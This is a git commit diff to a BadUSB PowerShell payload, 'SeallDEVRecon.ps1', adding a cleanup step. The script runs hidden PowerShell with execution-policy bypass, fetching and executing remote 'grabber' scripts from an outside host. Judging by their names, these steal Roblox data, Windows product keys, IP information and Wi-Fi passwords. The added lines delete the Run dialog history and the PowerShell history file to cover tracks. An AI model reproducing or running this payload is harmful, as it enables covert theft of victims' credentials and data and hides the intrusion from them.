547ada1eebd9e33380077fed56b4e9d581d2e2e2
sealldeveloper <120470330+sealldeveloper@users.noreply.github.com>
2023-01-07 17:28:41 +1100

    cleanup added

--- badusb/SeallDEVRecon.ps1
+++ badusb/SeallDEVRecon.ps1
@@ -3,3 +3,11 @@ powershell -w h -ep bypass $dc="$dc";irm https://files.seall.dev/badusb/RobloxGr
 powershell -w h -ep bypass $dc="$dc";irm https://files.seall.dev/badusb/WinKeyGrabber.ps1 | iex
 powershell -w h -ep bypass $dc="$dc";irm https://files.seall.dev/badusb/IpGrabber.ps1 | iex
 powershell -w h -ep bypass $dc="$dc";irm https://files.seall.dev/badusb/WifiGrabber.ps1 | iex
+
+# Delete run box history
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete powershell history
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
